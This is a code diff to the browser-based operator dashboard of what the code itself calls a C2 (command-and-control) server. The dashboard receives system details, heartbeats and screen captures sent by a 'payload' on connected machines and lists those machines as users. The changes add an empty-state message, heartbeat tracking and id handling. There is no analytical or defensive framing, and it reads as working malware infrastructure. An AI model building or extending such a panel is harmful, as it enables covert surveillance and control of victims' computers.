@@ -22,6 +22,7 @@
 
         /* Status Indicators */
         .status-dot { height: 10px; width: 10px; background-color: #4ade80; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .empty-state { text-align: center; color: #64748b; margin-top: 50px; font-style: italic; }
     </style>
 </head>
 <body>
@@ -29,6 +30,7 @@
 
     <!-- User Grid -->
     <div class="grid" id="userGrid"></div>
+    <div id="emptyState" class="empty-state">Waiting for connections...</div>
 
     <!-- Live Logs -->
     <h3>Live Event Log</h3>
@@ -41,9 +43,11 @@
 
         const ws = new WebSocket(wsUrl);
         let users = {};
+        let isConnected = false;
 
         ws.onopen = () => {
             console.log("Admin connected to C2");
+            // Register as admin immediately
             ws.send(JSON.stringify({ type: 'register_admin' }));
             addLog("Connected to C2 Server", "blue");
         };
@@ -51,48 +55,59 @@
         ws.onmessage = (event) => {
             try {
                 const data = JSON.parse(event.data);
-                const userId = data.targetId; // Always use targetId from the server
-
-                if (!userId) {
-                    console.warn("Received message without targetId:", data);
-                    return;
-                }
 
                 if (data.type === 'registered') {
                     ws.isAdmin = true;
                     addLog("Admin Session Registered", "blue");
                 }
                 else if (data.type === 'alert') {
+                    // Standard alert messages (New User, Disconnect)
                     addLog(data.message, data.message.includes('🟢') ? 'green' : 'red');
                 }
                 else if (data.type === 'info') {
+                    // Handle info packets from payload
                     addLog(`🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`, 'green');
 
-                    if (!users[userId]) {
-                        users[userId] = { status: 'Online', logs: [], info: data, lastSeen: Date.now() };
+                    // Add to grid
+                    if (!users[data.id]) {
+                        users[data.id] = { status: 'Online', logs: [], info: data, lastSeen: Date.now() };
                     } else {
-                        users[userId].status = 'Online';
-                        users[userId].info = data;
-                        users[userId].lastSeen = Date.now();
+                        // Update existing user info
+                        users[data.id].status = 'Online';
+                        users[data.id].info = data;
+                        users[data.id].lastSeen = Date.now();
                     }
                     renderUsers();
+                }
+                else if (data.type === 'heartbeat') {
+                    // Keep user alive in the UI
+                    if (users[data.id]) {
+                        users[data.id].lastSeen = Date.now();
+                        users[data.id].status = 'Online';
+                        renderUsers(); // Re-render to update timestamps
+                    }
                 }
                 else if (data.type === 'system') {
                     addLog(data.message, 'blue');
                 }
                 else if (data.type === 'screen_data') {
-                    addLog(`📺 Screen update from ${userId}`, 'blue');
+                    // Log screen updates
+                    addLog(`📺 Screen update from ${data.id}`, 'blue');
                     
-                    if (!users[userId]) {
-                        users[userId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
+                    // Ensure user exists in grid even if they didn't send 'info' first
+                    if (!users[data.id]) {
+                        users[data.id] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
                     }
-                    users[userId].lastSeen = Date.now();
+                    users[data.id].lastSeen = Date.now();
                     renderUsers();
                 }
                 else {
-                    if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'info' && data.type !== 'screen_data') {
-                        addLog(`[${userId}] Received: ${data.type}`, 'blue');
+                    // Generic fallback for other types (offer, answer, candidate)
+                    if (data.type !== 'registered' && data.type !== 'alert' && data.type !== 'info' && data.type !== 'screen_data' && data.type !== 'heartbeat') {
+                        addLog(`[${data.targetId || data.id}] Received: ${data.type}`, 'blue');
 
+                        // Ensure user exists in grid
+                        const userId = data.targetId || data.id;
                         if (!users[userId]) {
                             users[userId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now() };
                         }
@@ -123,6 +138,7 @@
 
             logContainer.prepend(div);
 
+            // Keep log size manageable
             if (logContainer.children.length > 100) {
                 logContainer.removeChild(logContainer.lastChild);
             }
@@ -130,7 +146,19 @@
 
         function renderUsers() {
             const grid = document.getElementById('userGrid');
+            const emptyState = document.getElementById('emptyState');
+            
+            // Clear current grid
             grid.innerHTML = '';
+
+            const userCount = Object.keys(users).length;
+            
+            if (userCount === 0) {
+                emptyState.style.display = 'block';
+                return;
+            } else {
+                emptyState.style.display = 'none';
+            }
 
             for (const [id, data] of Object.entries(users)) {
                 const card = document.createElement('div');
@@ -150,6 +178,7 @@
         }
 
         function joinUser(id) {
+            // Placeholder for actual WebRTC join logic
             alert(`Connecting to ${id}...`);
         }
     </script>
